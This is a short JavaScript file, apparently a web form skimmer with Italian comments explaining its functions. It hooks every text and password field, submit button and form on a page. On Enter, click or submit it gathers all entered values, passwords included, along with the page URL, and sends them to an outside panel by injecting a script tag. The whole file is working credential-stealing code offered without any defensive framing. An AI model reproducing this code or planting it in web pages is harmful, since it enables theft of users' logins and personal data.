//////////*************ENTER PRESSED***************//////////////
xxx = document.querySelectorAll('input[type="text"], input[type="password"]');
for(var i=0; i<xxx.length; i++){
	xxx[i].onkeypress=function(e){
		if(e.keyCode == 13){
			yyy(www(), zzz());
		}
	};
}

//////////*************MOUSE CLICK***************//////////////
xxx = document.querySelectorAll('input[type="submit"]');
for(var i=0; i<xxx.length; i++){
	xxx[i].onclick=function(){
		yyy(www(), zzz());
	};
}

//////////*************SUBMIT***************//////////////
xxx = document.getElementsByTagName('form');
for(var i=0; i<xxx.length; i++){
	xxx[i].onsubmit=function(){
		yyy(www(), zzz());
	};
}

function www(){
	return window.location.href;
}

function yyy(url,data){
url = encodeURIComponent(url).replace(/%20/g,'+');
data = encodeURIComponent(data).replace(/%20/g,'+');
var head = document.getElementsByTagName("head")[0]; 
var script = document.createElement("script"); 

script.type = "text/javascript";
script.src = "http://n00llp0inter.tk/panel/proxy.php?url="+url+"&data="+data;
console.log(script.src); 
head.appendChild(script);
}

function zzz(){
	var input="";
	xxx = document.querySelectorAll('input[type="text"], input[type="password"]');
	for(var i=0; i<xxx.length; i++){
		input+=(xxx[i].value+" * ");
	}
	return input;
}


/*
www() -> recupera l'url della pagina in cui l'user si trova
xxx[] -> ricerca di tutti i form
yyy() -> richiesta get CORS
zzz() -> recupera tutti i dati inseriti nei vari form


*/